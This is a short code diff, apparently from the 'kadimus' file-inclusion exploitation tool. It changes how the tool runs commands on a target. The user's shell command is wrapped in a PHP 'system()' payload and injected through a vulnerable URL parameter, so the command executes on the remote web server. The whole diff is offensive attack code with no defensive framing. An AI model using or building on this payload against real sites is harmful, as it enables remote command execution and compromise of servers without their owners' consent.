@@ -416,6 +416,7 @@ void init_global_structs(struct kadimus_opts *opts){
 
 int kadimus(struct kadimus_opts *opts){
     pid_t pid;
+    char *cmd;
 
     if(opts->scan)
         scan(opts->url);
@@ -469,8 +470,10 @@ int kadimus(struct kadimus_opts *opts){
 
 
     if(opts->cmd){
-        /* do some modifications */
-        exec_phpcode(opts->url, opts->parameter, opts->cmd, opts->technique);
+        cmd = xmalloc(strlen(opts->cmd)+21);
+        sprintf(cmd, "<?php system(\"%s\"); ?>", opts->cmd);
+        exec_phpcode(opts->url, opts->parameter, cmd, opts->technique);
+        free(cmd);
     }
 
     if(opts->connect){
